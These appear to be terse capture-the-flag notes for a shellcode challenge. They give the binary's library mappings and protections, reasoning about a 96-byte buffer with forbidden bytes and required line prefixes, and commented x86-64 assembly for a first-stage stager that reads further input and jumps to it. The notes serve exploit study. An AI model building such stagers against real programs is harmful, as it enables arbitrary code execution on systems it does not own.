linux-vdso.so.1 (0x00007fff34fd3000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f36dd315000)
/lib64/ld-linux-x86-64.so.2 (0x00007f36dd51b000)

Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments




buffer has 240 bytes (30 vars*8)
read 96 bytes into buffer 
first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
96/6=16 lines
divide the shellcode into lines of 6
first 16 lines must start with 0xc 0x87 0x63
after the 112 byte(16 bytes from the 16th line), the shellcode will be executed.
This means we have to limit the shellcode within 96 bytes


push 0x0 #
pop rdi  #set rdi to zero, since 0 is the file descriptor of stdin

push rbp #
pop rsi  #give rbp's address to rsi

push 0x20
pop rdx #this is the length we want to read

push 0x0 #
pop rax #set rax to zero, since 0 is read's syscall number

syscall #0f 05

call rbp #execute at rbp
